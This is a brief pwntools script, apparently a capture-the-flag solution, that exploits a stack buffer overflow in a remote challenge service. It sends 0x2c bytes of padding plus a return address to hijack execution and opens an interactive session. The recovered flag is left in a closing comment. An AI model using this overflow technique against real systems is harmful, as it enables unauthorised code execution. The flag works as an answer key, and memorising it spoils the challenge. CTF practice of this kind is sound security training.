from pwn import *

# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-f']

# p = gdb.debug('./simply_smashing', '''
#     b main
#     continue
# ''')

p = remote('recruit.osiris.bar', 21001)

p.recvuntil(b"We don't give you the flag anymore, but we did leave some code that might be useful...\n")
p.sendline(b"A"*0x2c + p32(0x80484ce))

p.interactive()

# flag{mayb3_y0u_c4n_le4rn_t0_st4ck_ov3rfl0w_0n_stackoverflow_h4h4}
